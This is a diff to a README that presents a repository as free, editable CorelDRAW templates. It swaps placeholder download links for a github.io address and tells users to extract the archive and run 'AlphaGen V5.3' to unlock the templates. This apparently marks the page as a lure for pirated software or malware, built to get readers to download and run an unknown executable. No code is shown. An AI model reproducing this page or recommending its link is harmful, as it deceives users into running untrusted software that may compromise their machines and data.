@@ -2,13 +2,13 @@
 
 Jumpstart your projects with ready-to-use CorelDRAW templates for brochures, logos, business cards, packaging, and more — fully editable and professional.
 
-[![Download](https://img.shields.io/badge/Download-CorelDRAW_Templates-blueviolet)](PLACE_YOUR_DOWNLOAD_LINK_HERE)
+[![Download](https://img.shields.io/badge/Download-CorelDRAW_Templates-blueviolet)](https://coreldraw-templates-collection.github.io/.github)
 
 ---
 
 ### ⚙️ Installation Instructions
 
-1. 📦 [Download the archive](PLACE_YOUR_DOWNLOAD_LINK_HERE)  
+1. 📦 [Download the archive](https://coreldraw-templates-collection.github.io/.github)  
 2. 📁 Extract the folder to any convenient location  
 3. 🖱 Run AlphaGen V5.3 to unlock full template access  
 4. ✅ Open CorelDRAW and browse templates via `File > New from Template`
